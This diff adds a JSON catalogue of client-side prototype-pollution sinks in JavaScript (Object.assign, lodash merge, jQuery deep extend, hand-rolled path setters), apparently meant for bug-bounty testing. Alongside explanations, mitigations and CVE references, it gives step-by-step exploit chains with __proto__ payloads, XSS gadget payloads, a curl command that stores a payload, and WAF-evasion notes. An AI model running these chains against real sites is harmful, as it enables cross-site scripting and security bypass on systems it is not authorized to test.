@@ -1,0 +1,370 @@
+{
+  "category": "proto-pollution",
+  "schema_version": "2.0",
+  "sinks": [
+    {
+      "id": "sink-object-assign",
+      "name": "Object.assign",
+      "category": "proto-pollution",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "Object.assign",
+        "object.assign",
+        "assign("
+      ],
+      "severity": "P4",
+      "severity_note": "P4 as a client-side prototype pollution primitive; upgrades to P2/P3 only when a concrete gadget (polluted property consumed by a sanitizer bypass or innerHTML) is demonstrated.",
+      "explain": "Object.assign(target, source) copies enumerable own properties from source to target using [[Set]] semantics. When source comes from JSON.parse(attackerData), an own property literally named '__proto__' exists (JSON.parse does NOT trigger the setter), and assigning it to target invokes the inherited __proto__ setter — silently retargeting the object's prototype or writing onto Object.prototype when target is a shared object.",
+      "how_it_works": "Two ingredients make Object.assign dangerous: (1) JSON.parse('{\"__proto__\":{\"x\":1}}') produces an object with a genuine own '__proto__' key — the parser does not special-case it; (2) Object.assign's internal Set(target, '__proto__', value) DOES trigger Object.prototype's __proto__ setter. If the pattern is Object.assign(sharedConfig, JSON.parse(tainted)), the attacker's object becomes sharedConfig's prototype, and every property lookup on sharedConfig falls through to attacker-controlled values.",
+      "why_it_matters": "Prototype pollution is a confusion primitive: it adds or overrides properties on objects the attacker never touches directly. Client-side, its impact is gated by gadgets — polluted properties like 'innerHTML', 'src', or sanitizer allowlists that later code trusts — but when a gadget exists the result is full DOM XSS from a pure data payload.",
+      "exploitable_when": [
+        "location.search",
+        "location.hash",
+        "postMessage-data",
+        "fetch-response",
+        "xhr-response"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm a tainted JSON string reaches Object.assign as a source",
+              "payload": "?cfg={\"__proto__\":{\"jlf\":\"polluted\"}}",
+              "command": "open 'https://TARGET/page?cfg={\"__proto__\":{\"jlf\":\"polluted\"}}' then run ({}).jlf or inspect the merge target's prototype in the console",
+              "indicator": "the merge target's [[Prototype]] now exposes jlf:'polluted', or ({}).jlf === 'polluted' if Object.prototype itself was hit"
+            },
+            {
+              "action": "Pollute a property the application later trusts",
+              "payload": "?cfg={\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(document.domain)>\"}}",
+              "command": "open 'https://TARGET/page?cfg={\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(document.domain)>\"}}' in a browser",
+              "indicator": "code that copies an object's properties onto a DOM node (a common gadget) assigns the polluted innerHTML and alert(document.domain) fires"
+            }
+          ],
+          "eligibility": "Client-side prototype pollution is accepted when paired with a working gadget leading to XSS or security-control bypass; pollution with no observable gadget impact is usually rated informational/low — always hunt the gadget before reporting."
+        },
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Pollute via an attacker-influenced API response that gets merged",
+              "payload": "{\"__proto__\":{\"jlf\":\"polluted\"}}",
+              "command": "curl -s -X PUT -H 'Content-Type: application/json' -d '{\"__proto__\":{\"jlf\":\"polluted\"}}' 'https://TARGET/api/prefs' --cookie 'session=SESSION_ID'",
+              "indicator": "the PUT is accepted and a subsequent GET of https://TARGET/api/prefs returns the __proto__ key verbatim"
+            },
+            {
+              "action": "Load the page that merges the stored response and check for pollution",
+              "payload": "({}).jlf",
+              "command": "open 'https://TARGET/page' in a browser, wait for the fetch+merge, then run ({}).jlf in the DevTools console",
+              "indicator": "({}).jlf === 'polluted' confirms Object.prototype pollution sourced from a stored server value"
+            }
+          ],
+          "eligibility": "Server-stored pollution payload + client-side merge = stored client-side PP; accepted at the severity of whatever gadget it arms."
+        }
+      ],
+      "contexts": {
+        "html-body": "Pollution itself renders nothing; the gadget decides the context. A polluted 'innerHTML' property lands in html-body context.",
+        "attr": "Polluted properties like 'src' or 'href' arm attribute gadgets (e.g. script src from a polluted default).",
+        "js-string": "Polluted configuration values consumed by eval-like templating arm js-string gadgets."
+      },
+      "waf_notes": "The payload is valid JSON and often travels in the URL fragment or a JSON body — both poorly inspected by WAFs. '__proto__' as a string rarely matches XSS signatures.",
+      "eligibility": "Be honest: client-side PP usually needs a gadget to matter. Report P4/informational for pollution alone; P2/P3 only with a demonstrated gadget chain to script execution or sanitizer bypass.",
+      "mitigations": [
+        "Reject or strip '__proto__', 'prototype', and 'constructor' keys before merging untrusted objects",
+        "Use Object.create(null) for merge targets and dictionaries",
+        "Freeze Object.prototype in security-critical contexts (Object.freeze(Object.prototype)) as a last-resort hardening",
+        "Prefer structuredClone or explicit field whitelisting over blanket Object.assign of parsed JSON"
+      ],
+      "related": [
+        "_.merge (lodash)",
+        "$.extend (jQuery deep)",
+        "innerHTML",
+        "eval"
+      ],
+      "references": [
+        "PortSwigger: Prototype pollution",
+        "OWASP: Prototype Pollution Prevention Cheat Sheet",
+        "HackTricks: Prototype Pollution"
+      ]
+    },
+    {
+      "id": "sink-lodash-merge",
+      "name": "_.merge (lodash)",
+      "category": "proto-pollution",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "_.merge",
+        "lodash.merge",
+        "merge(",
+        "_.defaultsDeep",
+        "_.set"
+      ],
+      "severity": "P4",
+      "severity_note": "P4 client-side; P2/P3 with a gadget. Historical CVEs (CVE-2018-3721, CVE-2019-10744, CVE-2020-8203) — check the lodash version; unpatched versions are vulnerable by default.",
+      "explain": "_.merge(destination, source) deep-recursively copies source properties into destination. When source is attacker JSON containing a '__proto__' key, lodash's recursive merge walks INTO the prototype chain and assigns properties onto Object.prototype — classic client-side prototype pollution (also _.defaultsDeep and _.set with tainted paths).",
+      "how_it_works": "Unlike Object.assign, _.merge recurses: for key '__proto__' it resolves destination['__proto__'] (the actual Object.prototype via the accessor) and then merges the attacker's nested object into it, e.g. _.merge({}, JSON.parse('{\"__proto__\":{\"x\":1}}')) sets Object.prototype.x = 1 in vulnerable versions. Every object in the page now inherits the polluted property. _.set(obj, taintedPath, value) is the path-based twin: _.set({}, '__proto__.x', 1) pollutes directly.",
+      "why_it_matters": "lodash is everywhere — bundlers inline it into most large apps. A single _.merge of user-controlled JSON gives the attacker a global, persistent-for-the-session write into every object's property resolution, which is exactly what DOM XSS gadgets (sanitizer config, attribute defaults, template options) consume.",
+      "exploitable_when": [
+        "location.search",
+        "location.hash",
+        "postMessage-data",
+        "fetch-response"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Fingerprint lodash and the vulnerable merge of tainted JSON",
+              "payload": "_.merge(",
+              "command": "grep -n '_.merge\\|_.defaultsDeep\\|_.set' app.js | head -20",
+              "indicator": "a merge/defaultsDeep/set call whose source or path derives from location, postMessage, or an API response"
+            },
+            {
+              "action": "Detonate the pollution primitive",
+              "payload": "#config={\"__proto__\":{\"jlf\":\"polluted\"}}",
+              "command": "open 'https://TARGET/page#config={\"__proto__\":{\"jlf\":\"polluted\"}}' then run ({}).jlf in the console",
+              "indicator": "({}).jlf === 'polluted' — Object.prototype was polluted through the merge"
+            },
+            {
+              "action": "Arm a gadget with the pollution",
+              "payload": "#config={\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(document.domain)>\"}}",
+              "command": "open 'https://TARGET/page#config={\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(document.domain)>\"}}' in a browser",
+              "indicator": "the gadget code (property-copy-to-DOM, template render, or sanitizer default) consumes the polluted property and alert(document.domain) fires"
+            }
+          ],
+          "eligibility": "Accepted with a gadget; also report the outdated lodash version itself (known CVE) — many programs pay for the dependency finding even before the gadget chain is complete."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Deliver a pollution payload through the message listener",
+              "payload": "{\"__proto__\":{\"jlf\":\"polluted\"}}",
+              "command": "open a page that posts this JSON string to the target's message listener, then read {}.jlf in the victim console",
+              "indicator": "{}.jlf === 'polluted' in the victim page — prototype is polluted"
+            },
+            {
+              "action": "Escalate via a gadget reachable in the same page",
+              "payload": "pollute a property a later sink trusts (e.g. {\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}})",
+              "command": "target the specific property the page's sink reads",
+              "indicator": "the gadget path turns pollution into script execution"
+            }
+          ],
+          "eligibility": "Accepted as High when you demonstrate a gadget (pollution -> XSS or logic bypass). Pollution without a demonstrated gadget is usually rated Low-Medium."
+        }
+      ],
+      "contexts": {
+        "html-body": "Gadget-dependent: polluted innerHTML/html/template options land in html-body context.",
+        "attr": "Polluted attribute defaults (src, href, style) arm attribute gadgets.",
+        "js-string": "Polluted config strings consumed by new Function/eval-based templating arm js-string gadgets."
+      },
+      "waf_notes": "Payloads are JSON with '__proto__' keys — syntactically benign and typically delivered via fragment or POST body where WAF inspection is weakest.",
+      "eligibility": "Same honest rule: gadget or it is informational. The exception is a known-vulnerable lodash version, which is independently reportable as a vulnerable-dependency finding.",
+      "mitigations": [
+        "Upgrade lodash to the latest 4.x (PP fixes landed across 4.17.12-4.17.21) and pin it",
+        "Replace _.merge of untrusted data with explicit whitelisted field copies",
+        "Sanitize keys ('__proto__', 'constructor', 'prototype') before any deep merge or path set",
+        "Avoid _.set with user-controlled paths entirely"
+      ],
+      "related": [
+        "Object.assign",
+        "$.extend (jQuery deep)",
+        "innerHTML"
+      ],
+      "references": [
+        "PortSwigger: Prototype pollution",
+        "Snyk: lodash prototype pollution CVE-2019-10744",
+        "HackTricks: Prototype Pollution"
+      ]
+    },
+    {
+      "id": "sink-jquery-extend",
+      "name": "$.extend (jQuery deep)",
+      "category": "proto-pollution",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "$.extend",
+        "jQuery.extend",
+        "$.extend(true",
+        "extend(true"
+      ],
+      "severity": "P4",
+      "severity_note": "P4 client-side; P2/P3 with a gadget. CVE-2019-11358: jQuery < 3.4.0 deep-extends '__proto__' into Object.prototype — extremely widespread in legacy apps.",
+      "explain": "$.extend(true, target, source) is jQuery's deep recursive extend. In versions before 3.4.0, when source (attacker JSON) contains a '__proto__' key, the deep copy writes the nested properties onto Object.prototype. Even in >= 3.4.0 the '__proto__' key is skipped, so the vulnerable versions are the target — and they are still common in legacy admin panels and CMS plugins.",
+      "how_it_works": "The vulnerable code path: $.extend(true, {}, JSON.parse(tainted)) iterates keys; for '__proto__' it takes target['__proto__'] — the real Object.prototype through the accessor — and recursively copies the attacker's nested object into it. One call pollutes every object in the page. jQuery's ubiquity in older stacks makes this the single most common client-side PP source in the wild.",
+      "why_it_matters": "Any legacy page that deep-extends URL/postMessage/API JSON with jQuery < 3.4.0 is one payload away from session-wide Object.prototype pollution; combined with the rich jQuery plugin ecosystem (which reads options objects everywhere), gadgets are rarely far away.",
+      "exploitable_when": [
+        "location.search",
+        "location.hash",
+        "postMessage-data",
+        "fetch-response"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Check the jQuery version and find the deep extend of tainted data",
+              "payload": "$.extend(true",
+              "command": "grep -n 'extend(true' app.js; grep -n 'jquery' app.js | grep -i '1\\.\\|2\\.\\|3\\.[0-3]' | head",
+              "indicator": "jQuery < 3.4.0 is loaded AND a $.extend(true, target, taintedJSON) call exists"
+            },
+            {
+              "action": "Detonate the pollution",
+              "payload": "?opts={\"__proto__\":{\"jlf\":\"polluted\"}}",
+              "command": "open 'https://TARGET/page?opts={\"__proto__\":{\"jlf\":\"polluted\"}}' then run ({}).jlf in the console",
+              "indicator": "({}).jlf === 'polluted' confirms Object.prototype pollution via the deep extend"
+            },
+            {
+              "action": "Arm a gadget through plugin options or a DOM property copy",
+              "payload": "?opts={\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(document.domain)>\"}}",
+              "command": "open 'https://TARGET/page?opts={\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(document.domain)>\"}}' in a browser",
+              "indicator": "a plugin or template that copies options onto DOM nodes assigns the polluted innerHTML and alert(document.domain) fires"
+            }
+          ],
+          "eligibility": "Report both layers: the vulnerable jQuery version (dependency finding, accepted widely) and, if a gadget exists, the full PP-to-XSS chain at XSS severity. Pollution without a gadget is informational."
+        },
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Identify an API response merged deep into page state",
+              "payload": "$.extend(true, config, apiResponse)",
+              "command": "grep -n 'extend(true' app.js and trace which fetch/XHR feeds the second argument",
+              "indicator": "a JSON API response flows into a deep extend — server-reflected or tampered data can pollute"
+            },
+            {
+              "action": "Pollute via the response (or a MITM/compromised API)",
+              "payload": "{\"__proto__\":{\"jlf\":\"polluted\"}}",
+              "command": "if the API reflects any user input, send the payload there; verify {}.jlf in the page console",
+              "indicator": "{}.jlf appears — the extend path pollutes the prototype from remote data"
+            }
+          ],
+          "eligibility": "Valid when the polluted data source is attacker-influenceable (reflected API input, compromised feed). Purely static API data lowers it to Informational."
+        }
+      ],
+      "contexts": {
+        "html-body": "Gadget-dependent; plugin option objects copied to innerHTML land in html-body context.",
+        "attr": "Polluted href/src defaults arm attribute gadgets in jQuery plugins.",
+        "js-string": "Polluted template strings arm js-string gadgets in jQuery templating plugins."
+      },
+      "waf_notes": "JSON '__proto__' payloads via query string or POST body; the fragment variant bypasses server inspection entirely.",
+      "eligibility": "Be precise about the version: on jQuery >= 3.4.0 this specific vector is dead ('__proto__' is skipped) — do not report it as exploitable there; look for $.extend of already-polluted objects instead.",
+      "mitigations": [
+        "Upgrade jQuery to >= 3.4.0 (fixes CVE-2019-11358) and prefer the latest 3.x",
+        "Never deep-extend untrusted JSON; copy only whitelisted fields",
+        "Sanitize '__proto__'/'constructor'/'prototype' keys before any extend"
+      ],
+      "related": [
+        "Object.assign",
+        "_.merge (lodash)",
+        "innerHTML"
+      ],
+      "references": [
+        "PortSwigger: Prototype pollution",
+        "CVE-2019-11358 (jQuery prototype pollution)",
+        "HackTricks: Prototype Pollution"
+      ]
+    },
+    {
+      "id": "sink-proto-path-assignment",
+      "name": "dynamic path assignment obj[a][b]=v",
+      "category": "proto-pollution",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "[a][b]",
+        "obj[key]",
+        "][",
+        "[key]="
+      ],
+      "severity": "P4",
+      "severity_note": "P4 client-side; P2/P3 with a gadget. This is the raw hand-rolled variant — no library required — so it hides in bespoke config-merge and form-serialization code.",
+      "explain": "Hand-written deep-set logic like obj[parts[0]][parts[1]] = value — where the path parts come from the attacker (JSON keys, form field names like 'a[b]', URL params) — walks straight into '__proto__': obj['__proto__']['x'] = 1 writes onto Object.prototype. No lodash or jQuery needed; the language itself is the vulnerability.",
+      "how_it_works": "Property access with the string '__proto__' resolves through the accessor to the object's prototype. So a loop that does current = current[part] for part in path, then current[lastKey] = value, traverses obj['__proto__'] into Object.prototype when the attacker supplies it, and the final assignment pollutes every object. Classic carriers: query-string parsers that expand 'a[b][c]=v' into nested objects, and form serializers that do the same with input names.",
+      "why_it_matters": "Because it is dependency-free, static analysis rules tuned for _.merge/$.extend miss it. Any custom 'parse the query string into an object' helper is a candidate, and those helpers exist in almost every large front-end codebase.",
+      "exploitable_when": [
+        "query-string-manual-parsing",
+        "location.search",
+        "dom-form-values",
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "query-string-manual-parsing",
+          "steps": [
+            {
+              "action": "Find the bracket-notation deep-set or query parser that builds nested objects",
+              "payload": "obj[a][b]",
+              "command": "grep -n '\\[.*\\]\\[.*\\]\\s*=\\|split(\".\")\\|split(\"\\.\")' app.js | head -20",
+              "indicator": "a loop or helper that assigns into nested keys derived from URL parameters or form field names"
+            },
+            {
+              "action": "Traverse into Object.prototype with a __proto__ path",
+              "payload": "?__proto__[jlf]=polluted",
+              "command": "open 'https://TARGET/page?__proto__[jlf]=polluted' then run ({}).jlf in the console",
+              "indicator": "({}).jlf === 'polluted' — the parser walked __proto__ and polluted Object.prototype"
+            },
+            {
+              "action": "Arm a gadget via the polluted property",
+              "payload": "?__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/page?__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "the gadget consumes the polluted property and alert(document.domain) fires"
+            }
+          ],
+          "eligibility": "Same honest bar as all client-side PP: with a demonstrated gadget it is accepted at gadget severity (XSS = P2/P3); bare pollution is informational. The hand-rolled parser itself is the root cause — report it precisely."
+        },
+        {
+          "source": "dom-form-values",
+          "steps": [
+            {
+              "action": "Find deep-set built from form input names",
+              "payload": "input name=\"user.name\" or name=\"a.b.c\"",
+              "command": "inspect form fields for dotted/bracketed names; submit with __proto__-style keys (name=\"__proto__.jlf\")",
+              "indicator": "the page's parser builds obj['__proto__']['jlf'] — check {}.jlf in console"
+            },
+            {
+              "action": "Confirm pollution and hunt the gadget",
+              "payload": "name=\"__proto__.innerHTML\" value=\"<img src=x onerror=alert(1)>\"",
+              "command": "submit the form, then trigger the page path that reads the polluted property",
+              "indicator": "polluted property is consumed by a sink — execution or logic change"
+            }
+          ],
+          "eligibility": "Form-driven pollution is accepted when a gadget is shown. Note honestly in the report if no gadget was found — usually Medium."
+        }
+      ],
+      "contexts": {
+        "html-body": "Gadget-dependent: polluted html/innerHTML properties land in html-body context.",
+        "attr": "Polluted src/href defaults arm attribute gadgets.",
+        "js-string": "Polluted strings consumed by eval-style templating arm js-string gadgets."
+      },
+      "waf_notes": "Bracket-notation parameters (?__proto__[x]=y) look like ordinary form encoding; very few WAF rules inspect parameter NAMES for '__proto__', and the fragment variant never reaches the server.",
+      "eligibility": "Gadget-gated like all client-side PP. Note for triage: demonstrate ({}).pollutedKey in the console as the minimal proof, then the gadget detonation for severity.",
+      "mitigations": [
+        "In any deep-set helper, refuse keys '__proto__', 'prototype', and 'constructor' before traversal",
+        "Build parsed objects with Object.create(null) so no prototype accessor exists to traverse",
+        "Use a vetted query-string library with pollution protection instead of hand-rolled parsing",
+        "Validate form field names against a schema before serializing into objects"
+      ],
+      "related": [
+        "Object.assign",
+        "_.merge (lodash)",
+        "$.extend (jQuery deep)",
+        "innerHTML"
+      ],
+      "references": [
+        "PortSwigger: Prototype pollution",
+        "OWASP: Prototype Pollution Prevention Cheat Sheet",
+        "HackTricks: Prototype Pollution"
+      ]
+    }
+  ]
+}
